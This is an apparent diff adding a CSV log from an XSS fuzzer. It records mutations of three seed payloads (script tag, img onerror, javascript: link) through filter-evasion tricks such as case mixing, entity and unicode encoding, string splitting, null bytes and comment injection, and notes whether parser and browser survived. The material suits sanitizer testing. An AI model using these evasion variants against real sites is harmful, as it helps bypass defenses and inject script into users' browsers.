@@ -1,0 +1,86 @@
+action,seed,mutated,changed,parser_alive,browser_alive
+A0,<script>alert(1)</script>,<script>alert(1)</script>,False,True,True
+A1,<script>alert(1)</script>,<script>alert(1)</script>,False,True,True
+A2,<script>alert(1)</script>,<script>alert(1)</script>,False,True,True
+A3,<script>alert(1)</script>,<script>alert(1)</script>,False,True,True
+A4,<script>alert(1)</script>,<SCrIPT>alert(1)</SCRipT>,True,True,True
+A5,<script>alert(1)</script>,<script>alert(1)</script>,False,True,True
+A6,<script>alert(1)</script>,<script>alert(1)</script>,False,True,True
+A7,<script>alert(1)</script>,<script>alert(1)</script>,False,True,True
+A8,<script>alert(1)</script>,<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(1)</script>,True,True,True
+A9,<script>alert(1)</script>,<script><script>alert(1)</script>,True,True,False
+A10,<script>alert(1)</script>,<script>alert(1)</script>,False,True,True
+A11,<script>alert(1)</script>,<script>&#97;&#108;&#101;&#114;&#116;(1)</script>,True,True,True
+A12,<script>alert(1)</script>,<script>alert(1)</script>,False,True,True
+A13,<script>alert(1)</script>,<script>alert(1)</script>,False,True,True
+A14,<script>alert(1)</script>,"<script>/drfv/
+alert(1)</script>",True,True,True
+A15,<script>alert(1)</script>,<script>alert`1`</script>,True,True,True
+A16,<script>alert(1)</script>,<script>alert(1)</script>,False,True,True
+A17,<script>alert(1)</script>,<script>alert(1)</script>,False,True,True
+A18,<script>alert(1)</script>,<script>\u0061\u006c\u0065\u0072\u0074(1)</script>,True,True,True
+A19,<script>alert(1)</script>,<script>alert(1)</script>,False,True,True
+A20,<script>alert(1)</script>,<script>alert(1)</script>,False,True,True
+A21,<script>alert(1)</script>,<script>top['al'+'ert'](1)</script>,True,True,True
+A22,<script>alert(1)</script>,<script>top[8680439..toString(30)](1)</script>,True,True,True
+A23,<script>alert(1)</script>,search?q=ok <script>alert(1)</script>,True,True,True
+A24,<script>alert(1)</script>,<script <!--x-->>alert(1)</script>,True,True,False
+A25,<script>alert(1)</script>,<script>alert(1)</script>,False,True,True
+A26,<script>alert(1)</script>,<script%00>alert(1)</script>,True,True,False
+A27,<script>alert(1)</script>,<script>top[/al/.source+/ert/.source](1)</script>,True,True,True
+A0,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)>,False,True,True
+A1,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)>,False,True,True
+A2,<img src=x onerror=alert(1)>,<img SRc=x ONERROr=alert(1)>,True,True,True
+A3,<img src=x onerror=alert(1)>,<img%0Asrc=x%0Aonerror=alert(1)>,True,True,True
+A4,<img src=x onerror=alert(1)>,<IMg SRC=X ONerRor=AlErt(1)>,True,True,True
+A5,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1) ,True,True,False
+A6,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)>,False,True,True
+A7,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)>,False,True,True
+A8,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)>,False,True,True
+A9,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)><img src=x onerror=alert(1)>,True,True,True
+A10,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)>,False,True,True
+A11,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)>,False,True,True
+A12,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)>,False,True,True
+A13,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)>,False,True,True
+A14,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)>,False,True,True
+A15,<img src=x onerror=alert(1)>,<img src=x onerror=alert`1`>,True,True,True
+A16,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)>,False,True,True
+A17,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)>,False,True,True
+A18,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)>,False,True,True
+A19,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)>,False,True,True
+A20,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)<,True,True,False
+A21,<img src=x onerror=alert(1)>,<img src=x onerror=top['al'+'ert'](1)>,True,True,True
+A22,<img src=x onerror=alert(1)>,<img src=x onerror=top[8680439..toString(30)](1)>,True,True,True
+A23,<img src=x onerror=alert(1)>,search?q=ok <img src=x onerror=alert(1)>,True,True,True
+A24,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1) <!--x-->>,True,True,True
+A25,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)>,False,True,True
+A26,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)%00>,True,True,True
+A27,<img src=x onerror=alert(1)>,<img src=x onerror=top[/al/.source+/ert/.source](1)>,True,True,True
+A0,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:alert(1)"">x</a>",False,True,True
+A1,"<a href=""javascript:alert(1)"">x</a>","<a href=""&#14javascript:alert(1)"">x</a>",True,True,True
+A2,"<a href=""javascript:alert(1)"">x</a>","<a HReF=""javascript:alert(1)"">x</a>",True,True,True
+A3,"<a href=""javascript:alert(1)"">x</a>","<a%0Ahref=""javascript:alert(1)"">x</a>",True,True,True
+A4,"<a href=""javascript:alert(1)"">x</a>","<A HrEF=""JAVAscRipT:aLerT(1)"">x</A>",True,True,True
+A5,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:alert(1)"">x</a>",False,True,True
+A6,"<a href=""javascript:alert(1)"">x</a>","<a href=""javas&NewLine;cript:alert(1)"">x</a>",True,True,False
+A7,"<a href=""javascript:alert(1)"">x</a>","<a href=""javas&#x09;cript:alert(1)"">x</a>",True,True,False
+A8,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:&#x61;&#x6c;&#x65;&#x72;&#x74;(1)"">x</a>",True,True,True
+A9,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:alert(1)""><a href=""javascript:alert(1)"">x</a>",True,True,True
+A10,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:alert(1)"">x</a>",False,True,True
+A11,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:&#97;&#108;&#101;&#114;&#116;(1)"">x</a>",True,True,True
+A12,"<a href=""javascript:alert(1)"">x</a>","<a href=""javas&colon;cript:alert(1)"">x</a>",True,True,False
+A13,"<a href=""javascript:alert(1)"">x</a>","<a href=""javas&Tab;cript:alert(1)"">x</a>",True,True,False
+A14,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:alert(1)"">x</a>",False,True,True
+A15,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:alert`1`"">x</a>",True,True,True
+A16,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:alert(1)"">x</a>",False,True,True
+A17,"<a href=""javascript:alert(1)"">x</a>",<a href=javascript:alert(1)>x</a>,True,True,True
+A18,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:\u0061\u006c\u0065\u0072\u0074(1)"">x</a>",True,True,True
+A19,"<a href=""javascript:alert(1)"">x</a>","<a href=""&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)"">x</a>",True,True,True
+A20,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:alert(1)"">x</a>",False,True,True
+A21,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:top['al'+'ert'](1)"">x</a>",True,True,True
+A22,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:top[8680439..toString(30)](1)"">x</a>",True,True,True
+A23,"<a href=""javascript:alert(1)"">x</a>","search?q=ok <a href=""javascript:alert(1)"">x</a>",True,True,True
+A24,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:alert(1)"" <!--x-->>x</a>",True,True,True
+A25,"<a href=""javascript:alert(1)"">x</a>","<a href=""vbscript:alert(1)"">x</a>",True,True,False
+A26,"<a href=""javascript:alert(1)"">x</a>","<a%00 href=""javascript:alert(1)"">x</a>",True,True,True
+A27,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:top[/al/.source+/ert/.source](1)"">x</a>",True,True,True
